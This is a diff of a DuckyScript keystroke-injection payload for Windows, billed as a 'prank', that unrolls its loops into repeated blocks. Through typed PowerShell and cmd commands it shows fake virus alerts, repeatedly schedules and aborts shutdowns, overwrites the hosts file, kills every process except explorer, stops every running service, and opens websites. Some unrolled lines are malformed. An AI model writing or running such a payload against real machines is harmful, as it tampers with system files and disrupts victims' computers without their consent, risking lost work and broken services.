@@ -11,7 +11,6 @@ ENTER
 
 DELAY 5000
 
-LOOP 10
   GUI r
   DELAY 500
   STRING powershell
@@ -38,7 +37,188 @@ LOOP 10
   STRING "start https://www.google.com"
   ENTER
   DELAY 1000
-LOOP 5
+    GUI r
+  DELAY 500
+  STRING powershell
+  ENTER
+  DELAY 500
+  STRING "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Your computer has been infected by a virus!','Virus Alert','OK','Warning')"
+  ENTER
+  DELAY 2000
+  STRING "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('This is just a prank! Stay calm!','Prank Alert','OK','Information')"
+  ENTER
+  DELAY 1000
+  STRING "Start-Process mspaint"
+  ENTER
+  DELAY 2000
+  STRING "Start-Process wordpad"
+  ENTER
+  DELAY 1000
+  STRING "start https://www.bing.com"
+  ENTER
+  DELAY 1000
+  STRING "start https://www.youtube.com/watch?v=dQw4w9WgXcQ"
+  ENTER
+  DELAY 1000
+  STRING "start https://www.google.com"
+  ENTER
+  DELAY 1000
+    GUI r
+  DELAY 500
+  STRING powershell
+  ENTER
+  DELAY 500
+  STRING "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Your computer has been infected by a virus!','Virus Alert','OK','Warning')"
+  ENTER
+  DELAY 2000
+  STRING "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('This is just a prank! Stay calm!','Prank Alert','OK','Information')"
+  ENTER
+  DELAY 1000
+  STRING "Start-Process mspaint"
+  ENTER
+  DELAY 2000
+  STRING "Start-Process wordpad"
+  ENTER
+  DELAY 1000
+  STRING "start https://www.bing.com"
+  ENTER
+  DELAY 1000
+  STRING "start https://www.youtube.com/watch?v=dQw4w9WgXcQ"
+  ENTER
+  DELAY 1000
+  STRING "start https://www.google.com"
+  ENTER
+  DELAY 1000
+    GUI r
+  DELAY 500
+  STRING powershell
+  ENTER
+  DELAY 500
+  STRING "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Your computer has been infected by a virus!','Virus Alert','OK','Warning')"
+  ENTER
+  DELAY 2000
+  STRING "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('This is just a prank! Stay calm!','Prank Alert','OK','Information')"
+  ENTER
+  DELAY 1000
+  STRING "Start-Process mspaint"
+  ENTER
+  DELAY 2000
+  STRING "Start-Process wordpad"
+  ENTER
+  DELAY 1000
+  STRING "start https://www.bing.com"
+  ENTER
+  DELAY 1000
+  STRING "start https://www.youtube.com/watch?v=dQw4w9WgXcQ"
+  ENTER
+  DELAY 1000
+  STRING "start https://www.google.com"
+  ENTER
+  DELAY 1000
+    GUI r
+  DELAY 500
+  STRING powershell
+  ENTER
+  DELAY 500
+  STRING "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Your computer has been infected by a virus!','Virus Alert','OK','Warning')"
+  ENTER
+  DELAY 2000
+  STRING "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('This is just a prank! Stay calm!','Prank Alert','OK','Information')"
+  ENTER
+  DELAY 1000
+  STRING "Start-Process mspaint"
+  ENTER
+  DELAY 2000
+  STRING "Start-Process wordpad"
+  ENTER
+  DELAY 1000
+  STRING "start https://www.bing.com"
+  ENTER
+  DELAY 1000
+  STRING "start https://www.youtube.com/watch?v=dQw4w9WgXcQ"
+  ENTER
+  DELAY 1000
+  STRING "start https://www.google.com"
+  ENTER
+  DELAY 1000
+    GUI r
+  DELAY 500
+  STRING powershell
+  ENTER
+  DELAY 500
+  STRING "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Your computer has been infected by a virus!','Virus Alert','OK','Warning')"
+  ENTER
+  DELAY 2000
+  STRING "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('This is just a prank! Stay calm!','Prank Alert','OK','Information')"
+  ENTER
+  DELAY 1000
+  STRING "Start-Process mspaint"
+  ENTER
+  DELAY 2000
+  STRING "Start-Process wordpad"
+  ENTER
+  DELAY 1000
+  STRING "start https://www.bing.com"
+  ENTER
+  DELAY 1000
+  STRING "start https://www.youtube.com/watch?v=dQw4w9WgXcQ"
+  ENTER
+  DELAY 1000
+  STRING "start https://www.google.com"
+  ENTER
+  DELAY 1000
+    GUI r
+  DELAY 500
+  STRING powershell
+  ENTER
+  DELAY 500
+  STRING "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Your computer has been infected by a virus!','Virus Alert','OK','Warning')"
+  ENTER
+  DELAY 2000
+  STRING "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('This is just a prank! Stay calm!','Prank Alert','OK','Information')"
+  ENTER
+  DELAY 1000
+  STRING "Start-Process mspaint"
+  ENTER
+  DELAY 2000
+  STRING "Start-Process wordpad"
+  ENTER
+  DELAY 1000
+  STRING "start https://www.bing.com"
+  ENTER
+  DELAY 1000
+  STRING "start https://www.youtube.com/watch?v=dQw4w9WgXcQ"
+  ENTER
+  DELAY 1000
+  STRING "start https://www.google.com"
+  ENTER
+  DELAY 1000
+    GUI r
+  DELAY 500
+  STRING powershell
+  ENTER
+  DELAY 500
+  STRING "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Your computer has been infected by a virus!','Virus Alert','OK','Warning')"
+  ENTER
+  DELAY 2000
+  STRING "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('This is just a prank! Stay calm!','Prank Alert','OK','Information')"
+  ENTER
+  DELAY 1000
+  STRING "Start-Process mspaint"
+  ENTER
+  DELAY 2000
+  STRING "Start-Process wordpad"
+  ENTER
+  DELAY 1000
+  STRING "start https://www.bing.com"
+  ENTER
+  DELAY 1000
+  STRING "start https://www.youtube.com/watch?v=dQw4w9WgXcQ"
+  ENTER
+  DELAY 1000
+  STRING "start https://www.google.com"
+  ENTER
+  DELAY 1000
   GUI r
   DELAY 500
   STRING cmd /c "shutdown /s /t 30"
@@ -46,8 +226,70 @@ LOOP 5
   DELAY 500
   STRING cmd /c "shutdown /a"
   ENTER
+    GUI r
+  DELAY 500
+  STRING cmd /c "shutdown /s /t 30"
+  ENTER
+  DELAY 500
+  STRING cmd /c "shutdown /a"
+  ENTER
+    GUI r
+  DELAY 500
+  STRING cmd /c "shutdown /s /t 30"
+  ENTER
+  DELAY 500
+  STRING cmd /c "shutdown /a"
+  ENTER
+    GUI r
+  DELAY 500
+  STRING cmd /c "shutdown /s /t 30"
+  ENTER
+  DELAY 500
+  STRING cmd /c "shutdown /a"
+  ENTER
+    GUI r
+  DELAY 500
+  STRING cmd /c "shutdown /s /t 30"
+  ENTER
+  DELAY 500
+  STRING cmd /c "shutdown /a"
+  ENTER
+    GUI r
+  DELAY 500
+  STRING cmd /c "shutdown /s /t 30"
+  ENTER
+  DELAY 500
+  STRING cmd /c "shutdown /a"
+  ENTER
+    GUI r
+  DELAY 500
+  STRING cmd /c "shutdown /s /t 30"
+  ENTER
+  DELAY 500
+  STRING cmd /c "shutdown /a"
+  ENTER
+    GUI r
+  DELAY 500
+  STRING cmd /c "shutdown /s /t 30"
+  ENTER
+  DELAY 500
+  STRING cmd /c "shutdown /a"
+  ENTER
+    GUI r
+  DELAY 500
+  STRING cmd /c "shutdown /s /t 30"
+  ENTER
+  DELAY 500
+  STRING cmd /c "shutdown /a"
+  ENTER
+    GUI r
+  DELAY 500
+  STRING cmd /c "shutdown /s /t 30"
+  ENTER
+  DELAY 500
+  STRING cmd /c "shutdown /a"
+  ENTER
 
-LOOP 5
   GUI r
   DELAY 500
   STRING powershell
@@ -57,26 +299,70 @@ LOOP 5
   ENTER
   DELAY 1000
 
-LOOP 5
-  STRING "C:\\Windows\\System32\\mspaint.exe"
+  GUI r
+  DELAY 500
+  STRING powershell
+  ENTER
+  DELAY 500
+  STRING "(Get-Content C:\\Windows\\System32\\drivers\\etc\\hosts) -replace 'localhost', '404 Not Found' | Set-Content C:\\Windows\\System32\\drivers\\etc\\hosts"
   ENTER
   DELAY 1000
 
-LOOP 5
-  STRING "C:\\Windows\\System32\\calc.exe"
+  GUI r
+  DELAY 500
+  STRING powershell
+  ENTER
+  DELAY 500
+  STRING "(Get-Content C:\\Windows\\System32\\drivers\\etc\\hosts) -replace 'localhost', '404 Not Found' | Set-Content C:\\Windows\\System32\\drivers\\etc\\hosts"
   ENTER
   DELAY 1000
 
-LOOP 5
-  STRING "C:\\Windows\\System32\\notepad.exe"
+  GUI r
+  DELAY 500
+  STRING powershell
+  ENTER
+  DELAY 500
+  STRING "(Get-Content C:\\Windows\\System32\\drivers\\etc\\hosts) -replace 'localhost', '404 Not Found' | Set-Content C:\\Windows\\System32\\drivers\\etc\\hosts"
   ENTER
   DELAY 1000
 
-LOOP 20
+  GUI r
+  DELAY 500
+  STRING powershell
+  ENTER
+  DELAY 500
+  STRING "(Get-Content C:\\Windows\\System32\\drivers\\etc\\hosts) -replace 'localhost', '404 Not Found' | Set-Content C:\\Windows\\System32\\drivers\\etc\\hosts"
+  ENTER
+  DELAY 1000
+
+  GUI r
+  DELAY 500
+  STRING powershell
+  ENTER
+  DELAY 500
+  STRING "(Get-Content C:\\Windows\\System32\\drivers\\etc\\hosts) -replace 'localhost', '404 Not Found' | Set-Content C:\\Windows\\System32\\drivers\\etc\\hosts"
+  ENTER
+  DELAY 1000
+
   CAPSLOCK
   DELAY 500
-
-LOOP 10
+  CAPSLOCK
+  DELAY 500  CAPSLOCK
+  DELAY 500
+    CAPSLOCK
+  DELAY 500
+    CAPSLOCK
+  DELAY 500
+    CAPSLOCK
+  DELAY 500
+    CAPSLOCK
+  DELAY 500
+    CAPSLOCK
+  DELAY 500
+    CAPSLOCK
+  DELAY 500
+    CAPSLOCK
+  DELAY 500
   GUI r
   DELAY 500
   STRING powershell
@@ -87,7 +373,6 @@ LOOP 10
 
 DELAY 1000
 
-LOOP 10
   GUI r
   DELAY 500
   STRING powershell
@@ -97,7 +382,6 @@ LOOP 10
   ENTER
   DELAY 1000
 
-LOOP 5
   GUI r
   DELAY 500
   STRING powershell
@@ -107,7 +391,6 @@ LOOP 5
   ENTER
   DELAY 500
 
-LOOP 10
   GUI r
   DELAY 500
   STRING powershell
@@ -118,7 +401,6 @@ LOOP 10
 
 DELAY 5000
 
-LOOP 5
   GUI r
   DELAY 500
   STRING powershell
@@ -127,7 +409,6 @@ LOOP 5
   STRING "Get-Process | Where-Object { $_.Name -ne 'explorer' } | Stop-Process"
   ENTER
 
-LOOP 5
   GUI r
   DELAY 500
   STRING powershell
@@ -146,13 +427,7 @@ DELAY 500
 STRING "Get-Service | Where-Object { $_.Status -eq 'Running' } | Stop-Service"
 ENTER
 
-LOOP 10
-  STRING "start https://www.google.com"
-  ENTER
-  DELAY 1000
 
-
-LOOP 5
   GUI r
   DELAY 500
   STRING powershell
@@ -162,7 +437,6 @@ LOOP 5
   ENTER
   DELAY 1000
 
-LOOP 5
   GUI r
   DELAY 500
   STRING powershell
@@ -172,7 +446,6 @@ LOOP 5
   ENTER
   DELAY 500
 
-LOOP 5
   GUI r
   DELAY 500
   STRING powershell
@@ -182,7 +455,6 @@ LOOP 5
   ENTER
   DELAY 1000
 
-LOOP 10
   GUI r
   DELAY 500
   STRING powershell
@@ -192,7 +464,6 @@ LOOP 10
   ENTER
   DELAY 500
 
-LOOP 5
   GUI r
   DELAY 500
   STRING powershell
@@ -202,7 +473,6 @@ LOOP 5
   ENTER
   DELAY 500
 
-LOOP 10
   GUI r
   DELAY 500
   STRING powershell
